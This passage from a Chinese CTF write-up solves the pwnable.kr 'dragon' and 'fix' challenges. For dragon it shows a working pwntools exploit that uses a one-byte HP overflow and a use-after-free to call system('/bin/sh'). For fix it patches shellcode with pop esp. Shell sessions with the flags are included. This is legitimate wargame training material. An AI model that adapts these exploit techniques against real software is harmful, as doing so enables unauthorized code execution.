    puts("Mama Dragon Has Appeared!");  // 出现了一只母龙, 可以看出母龙生命值多但是攻击力低
  }
  else  //  Count的最低位不为1, 则表示为偶数次战斗
  {
    v4[1] = 0;                // 将v4指针的第二个_DWORD元素设置为0
    *((_BYTE *)v4 + 8) = 50;  // 将v4指针的第一个_BYTE元素设置为50, 即龙的生命值
    *((_BYTE *)v4 + 9) = 5;   // 将v4指针的第二个_BYTE元素设置为5, 即龙每次回复的生命值
    v4[3] = 30;               // 将v4指针的第四个_DWORD元素设置为30, 即龙的攻击力
    *v4 = PrintMonsterInfo;   // 将PrintMonsterInfo函数的地址赋给v4指针的第一个_DWORD元素
    puts("Baby Dragon Has Appeared!");  // 出现了一只幼龙, 可以看出幼龙攻击力高但是生命值少
  }
  if ( a1 == 1 )   // 如果a1等于1, 说明用户选择成为牧师
  {
    *ptr = 1;                 // 将ptr指针的第一个_DWORD元素设置为1
    ptr[1] = 42;              // 将ptr指针的第二个_DWORD元素设置为42, 牧师的生命值
    ptr[2] = 50;              // 将ptr指针的第三个_DWORD元素设置为50, 牧师的最大法力值
    ptr[3] = PrintPlayerInfo; // 将PrintPlayerInfo函数的地址赋给ptr指针的第四个_DWORD元素
    v2 = PriestAttack((int)ptr, v4); // 调用PriestAttack()函数, 传递ptr和v4的地址作为参数, 并将返回值存储在v2中
  }
  else  // 如果a1不等于1而等于2, 说明用户选择成为骑士
  {
    if ( a1 != 2 )
      return;
    *ptr = 2;                 // 将ptr指针的第一个_DWORD元素设置为2
    ptr[1] = 50;              // 将ptr指针的第二个_DWORD元素设置为50, 骑士的生命值
    ptr[2] = 0;               // 将ptr指针的第三个_DWORD元素设置为0, 骑士没有法力值
    ptr[3] = PrintPlayerInfo; // 将PrintPlayerInfo函数的地址赋给ptr指针的第四个_DWORD元素
    v2 = KnightAttack((int)ptr, v4); // 调用PriestAttack()函数, 传递ptr和v4的地址作为参数, 并将返回值存储在v2中
  }
  if ( v2 )  // 如果v2的值为真（非零即真）表示战斗胜利
  {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    v5 = malloc(0x10u);         // 分配16个字节的内存空间, 用于存储英雄的名称
    __isoc99_scanf("%16s", v5); // 从用户输入中读取最多16个字节的字符串, 并将其存储在v5指向的内存中
    puts("And The Dragon You Have Defeated Was Called:");
    ((void (__cdecl *)(_DWORD *))*v4)(v4); // 调用PrintMonsterInfo函数, 传递v4的地址作为参数以打印龙的信息
  }
  else
  {
    puts("\nYou Have Been Defeated!");
  }
  free(ptr);  // 释放之前分配的内存
}
```

双击`PrintPlayerInfo()`函数查看详情，打印玩家信息。

```c
int __cdecl PrintPlayerInfo(int *a1)
{
  int result; // eax

  if ( *a1 == 1 )
    return printf(Str_Priest, a1[1], a1[2]);
  result = *a1;
  if ( *a1 == 2 )
    result = printf(Str_Knight, a1[1]);
  return result;
}
```

回到`FightDragon()`函数，双击`PriestAttack()`函数查看详情，我们可以看到牧师玩家打龙的技能：`1`技能Holy Bolt耗蓝`10`造成`20`伤害，`2`技能Clarity能回复满法力值，`3`技能HolyShield耗蓝`25`暂时无敌。正如前文所述，龙的生命值保存在`1`个字节中，意味着龙最大生命值是`127`，回血的时候存在溢出漏洞。我们通过技能HolyShield和Clarity，可以让龙血条溢出直接暴毙。

```c
int __cdecl PriestAttack(int a1, void *ptr)
{
  int v2; // eax

  do
  {
    (*(void (__cdecl **)(void *))ptr)(ptr);    // 调用ptr指针所指向的函数并传递ptr作为参数, 用于打印龙的信息
    (*(void (__cdecl **)(int))(a1 + 12))(a1);  // 调用a1所指向的函数, 并传递a1作为参数, 用于打印牧师玩家的信息
    v2 = GetChoice();  // 调用GetChoice()函数获取玩家选择的操作, 并将结果存储在变量v2中
    switch ( v2 )
    {
      case 2:  // 如果用户选择的操作是2, 表示使用了"Clarity"技能
        puts("Clarity! Your Mana Has Been Refreshed");
        *(_DWORD *)(a1 + 8) = 50;  // 将a1偏移量为8的位置（牧师的法力值）设置为50, 推测该技能是用来回复法力值的
        printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));  // 打印龙对牧师造成的伤害
        *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);  // 将a1偏移量为4的位置（牧师的生命值）减去龙对牧师造成的伤害
        printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));  // 打印龙回复的生命值
        *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);  // 将ptr偏移量为8的位置（龙的生命值）加上龙回复的生命值
        goto LABEL_11;  // 跳转到LABEL_11处执行代码
      case 3:  // 如果用户选择的操作是3, 表示使用了"HolyShield"技能, 不会掉血
        if ( *(int *)(a1 + 8) > 24 )  // 检查牧师的法力值是否大于24, 推测该技能耗蓝25法力值
        {
          puts("HolyShield! You Are Temporarily Invincible...");
          printf("But The Dragon Heals %d HP!\n", *((char *)ptr + 9));   // 打印龙回复的生命值
          *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);  // 将ptr偏移量为8的位置（龙的生命值）加上龙回复的生命值
          *(_DWORD *)(a1 + 8) -= 25;  // 将a1偏移量为8的位置（牧师的法力值）减去25
          goto LABEL_11;  // 跳转到LABEL_11处执行代码
        }
        break;
      case 1:  // 如果用户选择的操作是1, 表示使用了"Holy Bolt"技能
        if ( *(int *)(a1 + 8) > 9 )  // 检查牧师的法力值是否大于9, 推测该技能耗蓝10法力值
        {
          printf("Holy Bolt Deals %d Damage To The Dragon!\n", 20);  // 打印牧师玩家对龙造成的20点伤害
          *((_BYTE *)ptr + 8) -= 20;  // 将ptr偏移量为8的位置（龙的生命值）减去20
          *(_DWORD *)(a1 + 8) -= 10;  // 将a1偏移量为8的位置（牧师的法力值）减去10
          printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));  // 打印龙对牧师造成的伤害
          *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3); // 将a1偏移量为4的位置（牧师的生命值）减去龙对牧师造成的伤害
          printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));  // 打印龙回复的生命值
          *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);  // 将ptr偏移量为8的位置（龙的生命值）加上龙回复的生命值
          goto LABEL_11;  // 跳转到LABEL_11处执行代码
        }
        break;
      default:
        goto LABEL_11;
    }
    puts("Not Enough MP!");
LABEL_11:
    if ( *(int *)(a1 + 4) <= 0 )  // 检查牧师的生命值是否小于等于0, 如果是则表示牧师被击败返回0
    {
      free(ptr);  // 释放ptr指针指向的内存空间
      return 0;
    }
  }
  while ( *((char *)ptr + 8) > 0 );  // 判断龙的生命值是否大于0, 如果是则继续执行循环, 否则表示龙已被击败并返回1
  free(ptr);  // 释放ptr指针指向的内存空间
  return 1;
}
```

回到`FightDragon()`函数，双击`KnightAttack()`函数查看详情，这应该是骑士玩家打龙的函数，很明显骑士没有胜算。1技能Crash造成`20`点伤害，`2`技能Frenzy消耗`20`生命值造成`40`点伤害。

```c
int __cdecl KnightAttack(int a1, void *ptr)
{
  int v2; // eax

  do
  {
    (*(void (__cdecl **)(void *))ptr)(ptr);    // 调用ptr指针所指向的函数并传递ptr作为参数, 用于打印龙的信息
    (*(void (__cdecl **)(int))(a1 + 12))(a1);  // 调用a1所指向的函数, 并传递a1作为参数, 用于打印骑士玩家的信息
    v2 = GetChoice();  // 调用GetChoice()函数获取玩家选择的操作, 并将结果存储在变量v2中
    if ( v2 == 1 )  // 如果用户选择的操作是1, 表示使用了"Crash"技能
    {
      printf("Crash Deals %d Damage To The Dragon!\n", 20);  // 打印骑士玩家对龙造成的20点伤害
      *((_BYTE *)ptr + 8) -= 20;  // 将ptr偏移量为8的位置（龙的生命值）减去 20
      printf("But The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));  // 打印龙对骑士造成的伤害
      *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);  // 将a1偏移量为4的位置（骑士的生命值）减去龙对骑士造成的伤害
      printf("And The Dragon Heals %d HP!\n", *((char *)ptr + 9));  // 打印龙回复的生命值
      *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);  // 将ptr偏移量为 8 的位置（龙的生命值）加上龙回复的生命值
    }
    else if ( v2 == 2 )  // 如果用户选择的操作是2, 表示使用了"Frenzy"技能
    {
      printf("Frenzy Deals %d Damage To The Dragon!\n", 40);  // 打印骑士玩家对龙造成的40点伤害
      *((_BYTE *)ptr + 8) -= 40;  // 将ptr偏移量为8的位置（龙的生命值）减去40
      puts("But You Also Lose 20 HP...");  // 艹 这是蒙多医生吗？！用技能自己掉血
      *(_DWORD *)(a1 + 4) -= 20;  // 将 a1 偏移量为4的位置（骑士的生命值）减去20
      printf("And The Dragon Deals %d Damage To You!\n", *((_DWORD *)ptr + 3));  // 打印龙对骑士造成的伤害
      *(_DWORD *)(a1 + 4) -= *((_DWORD *)ptr + 3);  // 将a1偏移量为4的位置（骑士的生命值）减去龙对骑士造成的伤害
      printf("Plus The Dragon Heals %d HP!\n", *((char *)ptr + 9));  // 打印龙回复的生命值
      *((_BYTE *)ptr + 8) += *((_BYTE *)ptr + 9);  // 将ptr偏移量为 8 的位置（龙的生命值）加上龙回复的生命值
    }
    if ( *(int *)(a1 + 4) <= 0 )  // 检查骑士的生命值是否小于等于0, 如果是则表示骑士被击败返回0
    {
      free(ptr);  // 释放ptr指针指向的内存空间
      return 0;
    }
  }
  while ( *((char *)ptr + 8) > 0 );  // 判断龙的生命值是否大于0, 如果是则继续执行循环, 否则表示龙已被击败并返回1
  free(ptr);  // 释放ptr指针指向的内存空间
  return 1;
}
```

审计到这儿，基本可以确定这程序只有成为牧师和隐藏关卡中的`system("/bin/sh");`有用啦。在`FightDragon()`函数结束时，需要注意龙的内存空间已经在`PriestAttack()`函数中释放，但是在战斗胜利时用户输入完英雄姓名后，又调用了`PrintMonsterInfo()`函数打印龙的信息。这里存在`UAF`漏洞，他俩位于同一地址，我们能通过`v5`的值来覆写`v4`指针，所以我们只需要写入`shell`的地址让它调用。

```c
if ( v2 )  // 如果v2的值为真（非零即真）表示战斗胜利
{
  puts("Well Done Hero! You Killed The Dragon!");
  puts("The World Will Remember You As:");
  v5 = malloc(0x10u);         // 分配16个字节的内存空间, 用于存储英雄的名称
  __isoc99_scanf("%16s", v5); // 从用户输入中读取最多16个字节的字符串, 并将其存储在v5指向的内存中
  puts("And The Dragon You Have Defeated Was Called:");
  ((void (__cdecl *)(_DWORD *))*v4)(v4); // 调用PrintMonsterInfo函数, 传递v4的地址作为参数以打印龙的信息
}
```

`system("/bin/sh");`对应的汇编代码如下：

```assembly
.text:08048DBF                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:08048DC6                 call    _system
```

编写`Python`代码求解，开局先摆烂，因为面对幼龙没有赢面，死了一条命之后就能遇到母龙，母龙攻击低血量厚回血多，谁不爱呢？！

```bash
from pwn import *

io = remote('pwnable.kr', 9004)
shell = 0x8048dbf
for _ in range(4):
    io.sendline(b'1')
for _ in range(4):
    io.sendline(b'3\n3\n2')
io.sendline(p32(shell))
io.interactive()
```

提交`MaMa, Gandhi was right! :)`即可。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ python dragon.py                                                                                      
[+] Opening connection to pwnable.kr on port 9004: Done
[*] Switching to interactive mode
Welcome to Dragon Hunter!
Choose Your Hero
[ 1 ] Priest
[ 2 ] Knight
Baby Dragon Has Appeared!
[ Baby Dragon ] 50 HP / 30 Damage / +5 Life Regeneration.
[ Priest ] 42 HP / 50 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
Holy Bolt Deals 20 Damage To The Dragon!
But The Dragon Deals 30 Damage To You!
And The Dragon Heals 5 HP!
[ Baby Dragon ] 35 HP / 30 Damage / +5 Life Regeneration.
[ Priest ] 12 HP / 40 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
Holy Bolt Deals 20 Damage To The Dragon!
But The Dragon Deals 30 Damage To You!
And The Dragon Heals 5 HP!

You Have Been Defeated!
Choose Your Hero
[ 1 ] Priest
[ 2 ] Knight
Mama Dragon Has Appeared!
[ Mama Dragon ] 80 HP / 10 Damage / +4 Life Regeneration.
[ Priest ] 42 HP / 50 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
HolyShield! You Are Temporarily Invincible...
But The Dragon Heals 4 HP!
[ Mama Dragon ] 84 HP / 10 Damage / +4 Life Regeneration.
[ Priest ] 42 HP / 25 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
HolyShield! You Are Temporarily Invincible...
But The Dragon Heals 4 HP!
[ Mama Dragon ] 88 HP / 10 Damage / +4 Life Regeneration.
[ Priest ] 42 HP / 0 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
Clarity! Your Mana Has Been Refreshed
But The Dragon Deals 10 Damage To You!
And The Dragon Heals 4 HP!
[ Mama Dragon ] 92 HP / 10 Damage / +4 Life Regeneration.
[ Priest ] 32 HP / 50 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
HolyShield! You Are Temporarily Invincible...
But The Dragon Heals 4 HP!
[ Mama Dragon ] 96 HP / 10 Damage / +4 Life Regeneration.
[ Priest ] 32 HP / 25 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
HolyShield! You Are Temporarily Invincible...
But The Dragon Heals 4 HP!
[ Mama Dragon ] 100 HP / 10 Damage / +4 Life Regeneration.
[ Priest ] 32 HP / 0 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
Clarity! Your Mana Has Been Refreshed
But The Dragon Deals 10 Damage To You!
And The Dragon Heals 4 HP!
[ Mama Dragon ] 104 HP / 10 Damage / +4 Life Regeneration.
[ Priest ] 22 HP / 50 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
HolyShield! You Are Temporarily Invincible...
But The Dragon Heals 4 HP!
[ Mama Dragon ] 108 HP / 10 Damage / +4 Life Regeneration.
[ Priest ] 22 HP / 25 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
HolyShield! You Are Temporarily Invincible...
But The Dragon Heals 4 HP!
[ Mama Dragon ] 112 HP / 10 Damage / +4 Life Regeneration.
[ Priest ] 22 HP / 0 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
Clarity! Your Mana Has Been Refreshed
But The Dragon Deals 10 Damage To You!
And The Dragon Heals 4 HP!
[ Mama Dragon ] 116 HP / 10 Damage / +4 Life Regeneration.
[ Priest ] 12 HP / 50 MP
    [ 1 ] Holy Bolt [ C : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
HolyShield! You Are Temporarily Invincible...
But The Dragon Heals 4 HP!
[ Mama Dragon ] 120 HP / 10 Damage / +4 Life Regeneration.
[ Priest ] 12 HP / 25 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
HolyShield! You Are Temporarily Invincible...
But The Dragon Heals 4 HP!
[ Mama Dragon ] 124 HP / 10 Damage / +4 Life Regeneration.
[ Priest ] 12 HP / 0 MP
    [ 1 ] Holy Bolt [ Cost : 10 MP ]
        Deals 20 Damage.
    [ 2 ] Clarity [ Cost : 0 MP ]
        Refreshes All Mana.
    [ 3 ] HolyShield [ Cost: 25 MP ]
        You Become Temporarily Invincible.
Clarity! Your Mana Has Been Refreshed
But The Dragon Deals 10 Damage To You!
And The Dragon Heals 4 HP!
Well Done Hero! You Killed The Dragon!
The World Will Remember You As:
And The Dragon You Have Defeated Was Called:
$ cat flag
MaMa, Gandhi was right! :)
```

------

### fix

这是**Pwnable.kr**的第三十个挑战`fix`，来自**[Rookiss]**部分。

```bash
Why bother to make your own shellcode?
I can simply copy&paste from shell-storm.org
so I just copied it from shell-storm then used it for my buffer overflow exercise
but it doesn't work :(
can you please help me to fix this??


ssh fix@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh fix@pwnable.kr -p2222
fix@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Sat Jun 24 22:38:33 2023 from 39.144.38.147
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
fix@pwnable:~$ ls -la
total 40
drwxr-x---   5 root fix  4096 Mar 29  2018 .
drwxr-xr-x 117 root root 4096 Nov 10  2022 ..
d---------   2 root root 4096 Jul 13  2014 .bash_history
-r-xr-sr-x   1 root 1050 7604 Oct 26  2016 fix
-r--r-----   1 root fix   945 Oct 26  2016 fix.c
-r--r-----   1 root 1050   58 Jul 13  2014 flag
-rw-r-----   1 root 1050  262 Oct 26  2016 intended_solution.txt
dr-xr-xr-x   2 root root 4096 Aug 20  2014 .irssi
drwxr-xr-x   2 root root 4096 Oct 23  2016 .pwntools-cache
```

输入`cat fix.c`查看`fix.c`的源代码。

```c
fix@pwnable:~$ cat fix.c
#include <stdio.h>

// 23byte shellcode from http://shell-storm.org/shellcode/files/shellcode-827.php
char sc[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

void shellcode(){
    // a buffer we are about to exploit!
    char buf[20];

    // prepare shellcode on executable stack!
    strcpy(buf, sc);

    // overwrite return address!
    *(int*)(buf+32) = buf;

    printf("get shell\n");
}

int main(){
    printf("What the hell is wrong with my shellcode??????\n");
    printf("I just copied and pasted it from shell-storm.org :(\n");
    printf("Can you fix it for me?\n");

    unsigned int index=0;
    printf("Tell me the byte index to be fixed : ");
    scanf("%d", &index);
    fflush(stdin);

    if(index > 22)  return 0;

    int fix=0;
    printf("Tell me the value to be patched : ");
    scanf("%d", &fix);

    // patching my shellcode
    sc[index] = fix;

    // this should work..
    shellcode();
    return 0;
}
```

先反编译`shellcode`查看其汇编代码，貌似并没有问题。它功能是调用 `execve("/bin/sh", NULL, NULL)`，以获取交互式的`shell`。`$eax = 0x0b; $ebx="/bin/sh"; $ecx = 0x0; edx = 0x0;`执行`execve("/bin/sh", NULL, NULL)`。

```python
>>> from pwn import *
>>> print disasm("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
   0:   31 c0                   xor    eax,eax     # $eax = 0
   2:   50                      push   eax         # $eax的值压入栈中, 将其置为NULL
   3:   68 2f 2f 73 68          push   0x68732f2f  # 将ASCII字符串"//sh"的反序（little-endian）压入栈中
   8:   68 2f 62 69 6e          push   0x6e69622f  # 将ASCII字符串"/bin"的反序压入栈中
   d:   89 e3                   mov    ebx,esp     # $ebx = "/bin/sh"
   f:   50                      push   eax         # $eax的值压入栈中, 将其置为NULL
  10:   53                      push   ebx         # $ebx的值压入栈中, 即"/bin/sh"的地址
  11:   89 e1                   mov    ecx,esp     # 使$ecx指向$ebx, 此时ecx的值为参数指针argv
  13:   b0 0b                   mov    al,0xb      # 将al寄存器的值设为系统调用号11, 表示执行execve系统调用
  15:   cd 80                   int    0x80        # 触发软中断, 执行系统调用
```

用`gdb`进一步分析程序。

```assembly
fix@pwnable:~$ gdb ./fix
(gdb) source /usr/share/peda/peda.py
gdb-peda$ disassemble shellcode
Dump of assembler code for function shellcode:
   0x0804851b <+0>:     push   ebp         ;基址指针ebp入栈
   0x0804851c <+1>:     mov    ebp,esp     ;将栈指针esp移入ebp
   0x0804851e <+3>:     sub    esp,0x28    ;在栈上为局部变量buf预留空间
   0x08048521 <+6>:     sub    esp,0x8
   0x08048524 <+9>:     push   0x804a02c
   0x08048529 <+14>:    lea    eax,[ebp-0x1c]  ; buf的位置在esp
   0x0804852c <+17>:    push   eax
   0x0804852d <+18>:    call   0x80483d0 <strcpy@plt>
   0x08048532 <+23>:    add    esp,0x10
   0x08048535 <+26>:    lea    eax,[ebp-0x1c]
   0x08048538 <+29>:    add    eax,0x20
   0x0804853b <+32>:    lea    edx,[ebp-0x1c]
   0x0804853e <+35>:    mov    DWORD PTR [eax],edx  
   0x08048540 <+37>:    sub    esp,0xc
   0x08048543 <+40>:    push   0x80486b0
   0x08048548 <+45>:    call   0x80483e0 <puts@plt>
   0x0804854d <+50>:    add    esp,0x10
   0x08048550 <+53>:    nop
   0x08048551 <+54>:    leave  ; 等价于mov esp, ebp; pop ebp
   0x08048552 <+55>:    ret    ; 等价于pop eip
End of assembler dump.
gdb-peda$ b *shellcode+45
Breakpoint 1 at 0x8048548
gdb-peda$ r
Starting program: /home/fix/fix 
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 22
Tell me the value to be patched : 128
[----------------------------------registers-----------------------------------]
EAX: 0xffdbc6bc --> 0xffdbc69c --> 0x6850c031 
EBX: 0x0 
ECX: 0x804a040 --> 0x80cd0b 
EDX: 0xffdbc69c --> 0x6850c031 
ESI: 0xf7786000 --> 0x1b2db0 
EDI: 0xf7786000 --> 0x1b2db0 
EBP: 0xffdbc6b8 --> 0xffdbc6d8 --> 0x0 
ESP: 0xffdbc680 --> 0x80486b0 ("get shell")
EIP: 0x8048548 (<shellcode+45>: call   0x80483e0 <puts@plt>)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804853e <shellcode+35>:    mov    DWORD PTR [eax],edx
   0x8048540 <shellcode+37>:    sub    esp,0xc
   0x8048543 <shellcode+40>:    push   0x80486b0
=> 0x8048548 <shellcode+45>:    call   0x80483e0 <puts@plt>
   0x804854d <shellcode+50>:    add    esp,0x10
   0x8048550 <shellcode+53>:    nop
   0x8048551 <shellcode+54>:    leave  
   0x8048552 <shellcode+55>:    ret
Guessed arguments:
arg[0]: 0x80486b0 ("get shell")
[------------------------------------stack-------------------------------------]
0000| 0xffdbc680 --> 0x80486b0 ("get shell")
0004| 0xffdbc684 --> 0x804a02c --> 0x6850c031 
0008| 0xffdbc688 --> 0xffdbc6d8 --> 0x0 
0012| 0xffdbc68c --> 0xf75d2700 (0xf75d2700)
0016| 0xffdbc690 --> 0xf7786d60 --> 0xfbad2a84 
0020| 0xffdbc694 --> 0x8048764 ("Tell me the value to be patched : ")
0024| 0xffdbc698 --> 0xf762f0db (<__isoc99_scanf+11>:   add    ebx,0x156f25)
0028| 0xffdbc69c --> 0x6850c031 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048548 in shellcode ()
gdb-peda$ x/24b 0xffdbc69c
0xffdbc69c:     0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
0xffdbc6a4:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
0xffdbc6ac:     0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80    0x00
gdb-peda$ x/24b $esp+0x1c
0xffdbc69c:     0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
0xffdbc6a4:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
0xffdbc6ac:     0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80    0x00
gdb-peda$ x/24b &sc
0x804a02c <sc>: 0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
0x804a034 <sc+8>:       0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
0x804a03c <sc+16>:      0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80    0x00
# 好活 第一次遇见pwnable.kr系统初始化
Broadcast message from root@pwnable (somewhere) (Mon Jun 26 08:02:42 2023):    
                                                                               
24 hour interval system initialization will be started after 60 second.        
                                                                               
                                                                               
Broadcast message from root@pwnable (somewhere) (Mon Jun 26 08:02:42 2023):    
                                                                               
all running tasks will be killed in 60 sec. save important stuffs              
                                                                               
                                                                               
Broadcast message from root@pwnable (somewhere) (Mon Jun 26 08:02:42 2023):    
                                                                               
all files(not directory) in /tmp will be erased. so save your file inside somew
here like /tmp/yourname                                                        
                                                                               
caConnection to pwnable.kr closed by remote host.
Connection to pwnable.kr closed.
```

`shellcode`布置在栈中占了`23`个字节，`buf`变量的位置是`ebp-0x1c`（反汇编代码就能看出），所以`shellcode`尾部达到了`ebp-5`，然而函数返回执行`shellcode`时`esp`指向返回地址下面4个字节，这里相距`shellcode`有`13`字节。`push ebx` 之后的指令和栈重叠导致错误的出现，需要将`esp`的位置挪到离指令相当远的位置。修改一字节最快改变`esp`的方式只有`pop esp`，第一个`push eax`用于截断 "/bin//sh"不能更改，第`15`个字节的`push eax`对`shellcode`的影响较小，可以将它改成`pop esp`；运行到这里的栈顶为"/bin//sh"字符串，虽然可以作为地址但不符合栈的取值范围，需要用`ulimit`指令去除栈的地址范围限制：`ulimit -s unlimited`。

```python
>>> asm('pop esp').hex()
'5c'
>>> int('5c', 16)
92
>>> asm('push eax').hex()
'50'
```

将`index`为`15`的位置改为`0x5c`（即`92`）就能拿到`shell`，输入`cat flag`得到`Sorry for blaming shell-strom.org :) it was my ignorance!`。

```bash
fix@pwnable:~$ ./fix
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 92
get shell
Segmentation fault (core dumped)
fix@pwnable:~$ ulimit -s unlimited
fix@pwnable:~$ ./fix
What the hell is wrong with my shellcode??????
I just copied and pasted it from shell-storm.org :(
Can you fix it for me?
Tell me the byte index to be fixed : 15
Tell me the value to be patched : 92
get shell
$ cat flag
Sorry for blaming shell-strom.org :) it was my ignorance!
```

------

### syscall

这是**Pwnable.kr**的第三十一个挑战`syscall`，来自**[Rookiss]**部分。

```bash
I made a new system call for Linux kernel.
It converts lowercase letters to upper case letters.
would you like to see the implementation?

Download : http://pwnable.kr/bin/syscall.c


ssh syscall@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机，这题`SSH`进去跟 [**leg**](#leg) 有得一比。

```
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh syscall@pwnable.kr -p2222
syscall@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
